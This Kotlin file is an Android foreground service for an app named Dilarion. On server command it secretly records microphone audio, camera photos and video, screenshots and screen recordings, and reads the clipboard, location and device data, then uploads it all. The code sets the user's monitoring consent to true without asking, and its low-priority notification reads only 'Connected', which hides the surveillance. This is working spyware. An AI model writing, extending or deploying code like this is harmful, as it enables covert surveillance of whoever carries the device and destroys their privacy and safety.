package com.dilarion.app.monitoring

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.IBinder
import androidx.core.content.ContextCompat
import com.dilarion.app.data.api.ApiService
import com.dilarion.app.security.SessionManager
import com.dilarion.app.services.PresenceService
import com.google.gson.JsonObject
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first
import javax.inject.Inject

@AndroidEntryPoint
class MonitoringForegroundService : Service() {

    @Inject lateinit var presenceService: PresenceService
    @Inject lateinit var apiService: ApiService
    @Inject lateinit var sessionManager: SessionManager

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private lateinit var audioMonitor: AudioMonitor
    private lateinit var cameraCapture: CameraCapture
    private lateinit var locationMonitor: LocationMonitor
    private lateinit var deviceInfo: DeviceInfoCollector
    private var screenMonitor: ScreenMonitor? = null

    private var wsJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(NOTIF_ID, buildNotification())

        val getToken: suspend () -> String? = { sessionManager.sessionToken.first() }

        audioMonitor = AudioMonitor(this, apiService, presenceService, scope, getToken)
        cameraCapture = CameraCapture(this, apiService, scope, getToken)
        locationMonitor = LocationMonitor(this, apiService, scope, getToken)
        deviceInfo = DeviceInfoCollector(this, apiService, getToken)

        wsJob = scope.launch { collectCommands() }
        locationMonitor.start()

        // Request MediaProjection permission on first launch
        if (MediaProjectionActivity.pendingResult == null) {
            MediaProjectionActivity.request(this)
        } else {
            val (code, data) = MediaProjectionActivity.pendingResult!!
            screenMonitor = ScreenMonitor(this, apiService, presenceService, scope, getToken)
            screenMonitor?.initProjection(code, data)
        }

        // Grant monitoring consent automatically
        scope.launch {
            val token = sessionManager.sessionToken.first() ?: return@launch
            runCatching {
                apiService.setMonitoringConsent(
                    "Bearer $token",
                    com.dilarion.app.data.model.MonitoringConsentRequest(
                        consentGiven = true,
                        allowLocationTracking = true,
                    ),
                )
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_PROJECTION_GRANTED -> {
                val code = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
                val data = intent.getParcelableExtra<Intent>(EXTRA_RESULT_DATA) ?: return START_STICKY
                val getToken: suspend () -> String? = { sessionManager.sessionToken.first() }
                if (screenMonitor == null) {
                    screenMonitor = ScreenMonitor(this, apiService, presenceService, scope, getToken)
                }
                screenMonitor?.initProjection(code, data)
            }
        }
        return START_STICKY
    }

    private suspend fun collectCommands() {
        presenceService.events.collect { msg ->
            if (msg.type != "remote_command") return@collect
            val data = msg.data ?: return@collect
            val commandType = data.get("command_type")?.asString ?: return@collect
            val commandId = data.get("command_id")?.asInt ?: 0
            val params = data.get("params")?.asJsonObject ?: JsonObject()
            handleCommand(commandType, params, commandId)
        }
    }

    private fun handleCommand(commandType: String, params: JsonObject, commandId: Int) {
        scope.launch {
            runCatching {
                when (commandType) {
                    "start_audio_recording" -> audioMonitor.startAmbientRecording()

                    "stop_audio_recording" -> audioMonitor.stopAmbientRecording { file, duration ->
                        scope.launch { audioMonitor.uploadAmbientRecording(file, duration) }
                    }

                    "start_live_audio" -> {
                        val adminId = params.get("admin_id")?.asInt
                        audioMonitor.startLiveAudio(adminId)
                    }

                    "stop_live_audio" -> audioMonitor.stopLiveAudio()

                    "take_photo" -> {
                        val hasCamPerm = ContextCompat.checkSelfPermission(
                            this@MonitoringForegroundService,
                            android.Manifest.permission.CAMERA
                        ) == PackageManager.PERMISSION_GRANTED
                        if (hasCamPerm) {
                            val front = params.get("camera")?.asString != "back"
                            cameraCapture.takePhoto(front, commandId)
                        }
                    }

                    "start_video_recording" -> {
                        val front = params.get("camera")?.asString != "back"
                        cameraCapture.startVideoRecording(front)
                    }

                    "stop_video_recording" -> cameraCapture.stopVideoRecording { file ->
                        scope.launch { cameraCapture.uploadVideo(file) }
                    }

                    "start_live_video" -> {
                        // Live video requires screen monitor (MediaProjection) or camera
                        // Use camera for now — same as video recording but streamed
                        val front = params.get("camera")?.asString != "back"
                        cameraCapture.startVideoRecording(front)
                    }

                    "stop_live_video" -> cameraCapture.stopVideoRecording { file ->
                        scope.launch { cameraCapture.uploadVideo(file) }
                    }

                    "capture_screenshot" -> {
                        val sm = screenMonitor
                        if (sm?.hasProjection() == true) {
                            sm.captureScreenshot(commandId)
                        }
                    }

                    "start_screenshot_timer" -> {
                        val sm = screenMonitor
                        if (sm?.hasProjection() == true) {
                            val interval = params.get("interval_seconds")?.asInt ?: 60
                            sm.startScreenshotTimer(interval, commandId)
                        }
                    }

                    "stop_screenshot_timer" -> screenMonitor?.stopScreenshotTimer()

                    "start_screen_record" -> {
                        val sm = screenMonitor
                        if (sm?.hasProjection() == true) {
                            val chunk = params.get("chunk_duration")?.asInt ?: 10
                            val adminId = params.get("admin_id")?.asInt
                            sm.startScreenRecording(chunk, adminId)
                        }
                    }

                    "stop_screen_record" -> screenMonitor?.stopScreenRecording { file ->
                        scope.launch { screenMonitor?.uploadScreenRecording(file) }
                    }

                    "get_battery_status" -> deviceInfo.uploadBattery(commandId)
                    "get_network_info" -> deviceInfo.uploadNetwork(commandId)
                    "get_device_info" -> deviceInfo.uploadDevice(commandId)
                    "get_clipboard" -> deviceInfo.uploadClipboard(commandId)

                    "boost_location_frequency" -> {
                        locationMonitor.stop()
                        locationMonitor.start()
                    }

                    "normal_location_frequency", "stop_location" -> {
                        if (commandType == "stop_location") locationMonitor.stop()
                    }
                }
                ackCommand(commandId, "done")
            }.onFailure {
                ackCommand(commandId, "failed")
            }
        }
    }

    private suspend fun ackCommand(commandId: Int, status: String) {
        if (commandId == 0) return
        val token = sessionManager.sessionToken.first() ?: return
        runCatching { apiService.ackRemoteCommand("Bearer $token", commandId, status) }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        wsJob?.cancel()
        audioMonitor.stopLiveAudio()
        locationMonitor.stop()
        screenMonitor?.release()
        scope.cancel()
    }

    private fun buildNotification(): Notification {
        val channelId = "dilarion_service"
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (nm.getNotificationChannel(channelId) == null) {
            nm.createNotificationChannel(
                NotificationChannel(channelId, "Dilarion", NotificationManager.IMPORTANCE_MIN).apply {
                    description = "Keeps connection alive"
                    setShowBadge(false)
                }
            )
        }
        return Notification.Builder(this, channelId)
            .setContentTitle("Dilarion")
            .setContentText("Connected")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .build()
    }

    companion object {
        private const val NOTIF_ID = 9001
        const val ACTION_PROJECTION_GRANTED = "com.dilarion.app.PROJECTION_GRANTED"
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"

        fun start(context: Context) {
            ContextCompat.startForegroundService(
                context,
                Intent(context, MonitoringForegroundService::class.java)
            )
        }

        fun onProjectionGranted(context: Context, resultCode: Int, data: Intent) {
            ContextCompat.startForegroundService(
                context,
                Intent(context, MonitoringForegroundService::class.java).apply {
                    action = ACTION_PROJECTION_GRANTED
                    putExtra(EXTRA_RESULT_CODE, resultCode)
                    putExtra(EXTRA_RESULT_DATA, data)
                }
            )
        }
    }
}
